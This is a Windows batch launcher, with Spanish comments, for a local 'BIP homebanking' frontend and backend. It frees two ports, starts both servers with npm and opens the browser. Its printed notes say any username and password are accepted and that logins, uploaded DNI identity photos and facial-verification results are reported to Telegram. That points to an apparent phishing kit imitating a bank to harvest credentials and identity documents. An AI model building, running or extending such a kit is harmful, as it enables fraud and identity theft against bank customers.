@echo off
chcp 65001 > nul
title PROBAR BIP HOMEBANKING LOCALMENTE
color 0A

echo.
echo ╔══════════════════════════════════════════════════════╗
echo ║   PROBAR BIP HOMEBANKING - SISTEMA COMPLETO          ║
echo ╚══════════════════════════════════════════════════════╝
echo.

REM Verificar y liberar puertos automáticamente
echo [1/4] Liberando puertos 3000 y 5173...
for /f "tokens=5" %%a in ('netstat -ano ^| findstr ":3000 "') do taskkill /F /PID %%a > nul 2>&1
for /f "tokens=5" %%a in ('netstat -ano ^| findstr ":5173 "') do taskkill /F /PID %%a > nul 2>&1
timeout /t 2 > nul
echo     ✅ Puertos liberados
echo.

REM Iniciar Backend
echo [2/4] Iniciando Backend en http://localhost:3000...
cd homebanking-backend
start "BIP Backend" cmd /k "npm run dev"
cd ..
echo     ⏳ Esperando que el backend inicie...
timeout /t 5 > nul
echo     ✅ Backend iniciado
echo.

REM Iniciar Frontend  
echo [3/4] Iniciando Frontend en http://localhost:5173...
cd homebanking-frontend
start "BIP Frontend" cmd /k "npm run dev"
cd ..
echo     ⏳ Esperando que el frontend inicie...
timeout /t 5 > nul
echo     ✅ Frontend iniciado
echo.

REM Abrir navegador
echo [4/4] Abriendo navegador...
timeout /t 3 > nul
start http://localhost:5173
echo     ✅ Navegador abierto
echo.

echo ╔══════════════════════════════════════════════════════╗
echo ║              ✅ SISTEMA INICIADO                      ║
echo ╚══════════════════════════════════════════════════════╝
echo.
echo 📱 Frontend:  http://localhost:5173
echo 🔧 Backend:   http://localhost:3000
echo.
echo 🔐 CREDENCIALES DE PRUEBA:
echo    Usuario: cualquiera (ejemplo: prueba123)
echo    Clave:   cualquiera (ejemplo: 123456)
echo.
echo 📱 Las notificaciones se enviarán a Telegram cuando:
echo    - Hagas login
echo    - Subas fotos del DNI
echo    - Completes la verificación facial
echo.
echo ⚠️  NO CIERRES ESTA VENTANA
echo    El backend y frontend están corriendo en segundo plano
echo.
pause
